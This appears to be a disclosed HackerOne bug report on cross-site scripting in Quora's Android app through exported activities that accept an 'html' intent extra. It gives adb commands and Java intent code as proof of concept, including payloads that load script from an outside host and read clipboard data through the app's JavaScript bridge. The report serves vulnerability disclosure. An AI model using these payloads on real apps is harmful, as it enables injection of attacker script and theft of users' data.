@@ -1,0 +1,64 @@
+ReportLink:https://hackerone.com/reports/189793
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/bobrov
+ReportedTo:Quora(quora)
+BountyAmount:150.0
+Severity:low
+State:Closed
+DateOfDisclosure:05.04.2017 6:23:59
+
+Summary:
+
+**Summary:**
+XSS via start ContentActivity using 'html' parameter.
+
+**Description (Include Impact):**
+Arbitrary applications on Android can run the exported activities ContentActivity, ModalContentActivity and ActionBarContentActivity. Using intent extra parameter `html` we can pass javascript, which will be executed in the context of www.quora.com.
+
+Impact: 
+* typical XSS on www.quora.com
+* access to QuoraAndroid JSBridge (for example, ClipboardData )
+* RCE on old Android <= 4.2 (see references)
+
+### Steps To Reproduce
+
+**Using ADB**
+alert(123)
+```
+adb shell
+am start -n com.quora.android/com.quora.android.ActionBarContentActivity -e url 'http://test/test' -e html 'XSS<script>alert(123)</script>'
+```
+Run script from external host
+```
+am start -n com.quora.android/com.quora.android.ActionBarContentActivity -e url 'http://test/test' -e html '<script src=//blackfan.ru></script>'
+am start -n com.quora.android/com.quora.android.ContentActivity -e url 'http://test/test' -e html '<script src=//blackfan.ru></script>'
+am start -n com.quora.android/com.quora.android.ModalContentActivity -e url 'http://test/test' -e html '<script src=//blackfan.ru></script>'
+```
+
+Access to ClipboardData
+```
+am start -n com.quora.android/com.quora.android.ModalContentActivity -e url 'http://test/test' -e html '<script>alert(QuoraAndroid.getClipboardData());</script>'
+```
+
+**Using another app**
+```
+Intent i = new Intent();
+i.setComponent(new ComponentName("com.quora.android","com.quora.android.ActionBarContentActivity"));
+i.putExtra("url","http://test/test");
+i.putExtra("html","XSS PoC <script>alert(123)</script>");
+startActivity(i);
+```
+
+### Your Environment (Browser version, Device, app version, os version etc)
+
+ * Nexus 5, Android 6.0.1
+
+### Supporting Material/References (Screenshots)
+
+ * https://labs.mwrinfosecurity.com/blog/webview-addjavascriptinterface-remote-code-execution/
+
+**XSS**
+{F142023}
+
+**Access to ClipboardData**
+{F142024}
